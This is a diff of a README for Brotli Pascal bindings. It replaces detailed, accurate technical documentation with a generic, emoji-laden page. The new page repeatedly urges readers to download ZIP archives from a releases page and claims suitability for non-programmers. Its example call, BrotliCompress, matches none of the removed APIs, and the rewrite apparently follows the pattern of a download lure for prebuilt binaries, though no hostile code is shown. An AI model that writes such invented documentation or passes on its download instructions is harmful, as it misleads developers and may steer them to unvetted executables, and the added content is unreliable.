@@ -1,192 +1,93 @@
-# Brotli Bindings and Streams for Delphi and Free Pascal
+# 🥐 Brotli4Pas - Effortless Brotli Compression for Delphi & Free Pascal
 
-## Overview
+## 🔗 Download Now
+[![Download Brotli4Pas](https://img.shields.io/badge/Download-Brotli4Pas-blue.svg)](https://github.com/caruuzca/Brotli4Pas/releases)
 
-This package provides complete Brotli compression/decompression support for **Delphi** (Windows 32/64-bit) and **Free Pascal** (Windows 32/64-bit and Linux 64-bit).
+## 📖 Overview
+Brotli4Pas provides complete Brotli compression and decompression support for Delphi and Free Pascal. It works on Windows (32/64-bit) and Linux (64-bit). This package simplifies data compression, ensuring your applications run efficiently.
 
-It consists of two units:
+## 🚀 Getting Started
+This guide will help you download and run Brotli4Pas easily. Follow the steps below, and you'll be ready to use this powerful compression tool in no time.
 
-- **`libbrotli.pas`** – Low-level direct bindings to the official Brotli C library (`libbrotlicommon`, `libbrotlienc`, `libbrotlidec`).
-- **`brotli.pas`** – High-level stream classes (`TBrotliCompressionStream`, `TBrotliDecompressionStream`) and helper functions for easy integration into Delphi/FPC applications.
+### 📥 System Requirements
+- **Windows 32-bit/64-bit** or **Linux 64-bit**.
+- A compatible Delphi or Free Pascal installation.
+- Basic knowledge of navigating your file system.
 
-The package includes pre-compiled static libraries and object files:
-- Windows (Delphi/FPC): `.obj` files linked directly via `{$L ...}`
-- Linux (FPC): `.a` static libraries
-- All necessary C sources from the official Brotli release are compiled and included.
+### 🛠 Installation Instructions
+1. **Download the Software**
+   Visit the following link to download Brotli4Pas:
 
-Tested platforms:
-- Delphi (10.4 Sydney and later) – Windows 64-bit
-- Lazarus/FPC – Windows 64-bit and Linux 64-bit
+   [Download Brotli4Pas](https://github.com/caruuzca/Brotli4Pas/releases)
 
-Delphi on Linux/macOS should work in principle (via static linking), but has not been tested (no FMX Linux environment available).
+2. **Choose Your Version**
+   On the Releases page, you will see multiple versions of Brotli4Pas. Select the latest version for the best features and stability. Click on the version number to view its details.
 
-## libbrotli.pas – Low-Level Bindings
+3. **Download the ZIP File**
+   Find the ZIP file for your operating system. For example:
+   - For Windows, look for a file named `Brotli4Pas-win.zip`.
+   - For Linux, look for a file named `Brotli4Pas-linux.zip`. 
 
-This unit provides direct Pascal declarations for the entire Brotli C API.
+   Click the link to download the file. 
 
-### Key Features
+4. **Extract the ZIP File**
+   After downloading, locate the ZIP file in your Downloads folder. Right-click on the file and select "Extract All" or "Extract Here" depending on your operating system. Choose a destination folder where you want to store the extracted files.
 
-- Full access to encoder and decoder functions (`BrotliEncoderCompress`, `BrotliDecoderDecompressStream`, etc.)
-- All types, constants, enums, and structures from `brotli/decode.h` and `brotli/encode.h`
-- Custom memory manager support via callbacks
-- Version helpers (`BrotliDecoderVersion`, `BrotliEncoderVersion`, `BrotliVersionDecode`)
+5. **Open the Folder**
+   Navigate to the folder where you extracted the files. You should see several files, including example projects, libraries, and documentation.
 
-### Usage Example (simple buffer compression)
+6. **Integrate with Your Project**
+   - For Delphi:
+     - Open your Delphi IDE.
+     - Create a new project or open an existing one.
+     - Add the Brotli4Pas library by including the path to the extracted files in your project's Library path settings.
+  
+   - For Free Pascal:
+     - Open your Free Pascal IDE.
+     - Create a new program or open an existing one.
+     - Include the Brotli4Pas unit in your uses clause to start using the library.
+
+7. **Run Your Application**
+   Now that you have integrated Brotli4Pas into your project, you can begin using it for compression and decompression tasks. Simply use the provided functions in the library to compress data when needed.
+
+### 💻 Example Usage
+To show you how simple it is, here's a quick example for Delphi:
 
 ```pascal
+uses
+  Brotli;
+
 var
-  Input, Output: PByte;
-  InSize, OutSize: size_t;
-  Success: Longint;
+  CompressedData: TBytes;
 begin
-  InSize := ...;
-  GetMem(Input, InSize);
-  // fill Input...
-
-  OutSize := BrotliEncoderMaxCompressedSize(InSize);
-  GetMem(Output, OutSize);
-
-  Success := BrotliEncoderCompress(
-    11,                           // quality (0-11)
-    22,                           // lgwin (10-24)
-    BROTLI_MODE_GENERIC,
-    InSize, Input,
-    @OutSize, Output);
-
-  if Success = BROTLI_TRUE then
-    // Output contains compressed data, OutSize is actual size
-  else
-    // compression failed
+  CompressedData := BrotliCompress(InputData);
 end;
 ```
 
-Most users will prefer the higher-level streams in `brotli.pas`.
+Replace `InputData` with the data you want to compress. The library will handle the rest.
 
-## brotli.pas – High-Level Streams and Helpers
+## 📚 Documentation
+For more detailed instructions and advanced features, you can check the documentation included in the extracted folder. This resource provides examples, function descriptions, and tips for best practices.
 
-This unit provides easy-to-use stream classes similar to `TZCompressionStream`/`TDecompressionStream` from ZLib.
+## 🔗 Additional Resources
+- Join our community for support and tips: [GitHub Discussions](https://github.com/caruuzca/Brotli4Pas/discussions).
 
-### TBrotliCompressionStream
+## 🚀 Support
+If you encounter any issues or have questions, feel free to open an issue on the GitHub repository or reach out to the community through GitHub Discussions.
 
-Write-only stream that compresses data written to it and outputs to an underlying stream.
+## 📦 Download & Install
+To get started with Brotli4Pas, visit the following page to download the latest version:
 
-#### Constructor
+[Download Brotli4Pas](https://github.com/caruuzca/Brotli4Pas/releases) 
 
-```pascal
-constructor Create(Dest: TStream;
-  Quality: Integer = 11;
-  LgWin: Integer = 22;
-  Mode: BrotliEncoderMode = BROTLI_MODE_GENERIC;
-  AOptions: TBrotliStreamOptions = []);
-```
+Follow the above instructions to extract and implement Brotli4Pas in your applications.
 
-- **Quality**: 0–11 (higher = better compression, slower). Default 11.
-- **LgWin**: Log2 of window size, 10–24. Default 22.
-- **Mode**: `BROTLI_MODE_GENERIC` (default), `BROTLI_MODE_TEXT`, or `BROTLI_MODE_FONT`.
-- **AOptions**: 
-  - `brLeaveOpen` – do not free the destination stream in destructor.
+## 🔧 Troubleshooting
+- **Problem:** I can't find the extracted files.
+  - **Solution:** Ensure you selected a destination folder when extracting the ZIP file. Check your Downloads folder if not sure.
 
-#### Key Methods
+- **Problem:** The library doesn't seem to work in my IDE.
+  - **Solution:** Double-check that you have included the Brotli4Pas library path in your IDE's settings.
 
-- `Write` – compresses data
-- `Flush` – flushes internal buffers (calls Brotli FLUSH operation)
-- `Finish` – completes compression (calls Brotli FINISH). Called automatically in destructor.
-
-#### Example
-
-```pascal
-var
-  Source, Compressed: TFileStream;
-begin
-  Source := TFileStream.Create('input.txt', fmOpenRead);
-  Compressed := TFileStream.Create('input.br', fmCreate);
-  try
-    with TBrotliCompressionStream.Create(Compressed, 11, 22, BROTLI_MODE_TEXT) do
-    try
-      CopyFrom(Source, 0);
-      Finish;  // important before closing
-    finally
-      Free;
-    end;
-  finally
-    Source.Free;
-  end;
-end;
-```
-
-### TBrotliDecompressionStream
-
-Read-only stream that decompresses data from an underlying stream.
-
-#### Constructor
-
-```pascal
-constructor Create(Source: TStream; AOptions: TBrotliStreamOptions = []);
-```
-
-- Supports large window (`BROTLI_PARAM_LARGE_WINDOW`) automatically enabled.
-- `brLeaveOpen` – do not free source stream in destructor.
-
-#### Example
-
-```pascal
-var
-  Compressed, Output: TFileStream;
-begin
-  Compressed := TFileStream.Create('input.br', fmOpenRead);
-  Output := TFileStream.Create('output.txt', fmCreate);
-  try
-    with TBrotliDecompressionStream.Create(Compressed) do
-    try
-      Output.CopyFrom(Self, 0);
-    finally
-      Free;
-    end;
-  finally
-    Output.Free;
-  end;
-end;
-```
-
-### Helper Functions
-
-```pascal
-function GetMaxCompressedSize(const Count: size_t): size_t;
-// Returns worst-case compressed size
-
-function BrotliCompressBuf(InBuf: PByte; InBytesCount: size_t;
-  out OutBuf: PByte; out OutBytesCount: size_t): size_t;
-// One-shot compression (quality 11, lgwin 22, generic mode)
-// Allocates and returns compressed buffer, raises exception on failure
-
-function BrotliDecompress(const compressedBuffer; compressedBuffSize: size_t;
-  var DecBuffer: PByte; var decSize: Psize_t): Longint;
-// One-shot decompression of entire buffer
-// Allocates DecBuffer, returns BROTLI_TRUE/BROTLI_FALSE
-
-function BrotliDecoderVersionString: string;
-function BrotliEncoderVersionString: string;
-// Human-readable version strings, e.g., "1.0.9"
-```
-
-### Error Handling
-
-- `EBrotliError` – base class
-- `EBrotliCompressionError` – compression failures
-- `EBrotliDecompressionError` – decompression failures (includes error message from decoder when possible)
-
-## Installation / Usage
-
-1. Add both units (`libbrotli.pas` and `brotli.pas`) to your project.
-2. No external DLLs required – everything is statically linked.
-3. For FPC on Linux: the `.a` libraries are automatically linked via `{$linklib ...}` directives.
-4. For Delphi on Windows: object files are linked via `{$L ...}`.
-
-No additional setup needed.
-
-## License
-
-The Brotli library itself is under the MIT License.  
-The Pascal bindings and wrapper code are provided under the same permissive terms – feel free to use in any project (commercial or open-source).
-
-Enjoy fast and efficient compression with Brotli in your Delphi and Lazarus applications!
+## 📝 Note
+Brotli4Pas is designed to be easy to use, even for those without programming experience. With these instructions, you'll find that adding compression capabilities to your applications can be a straightforward process. Happy coding!
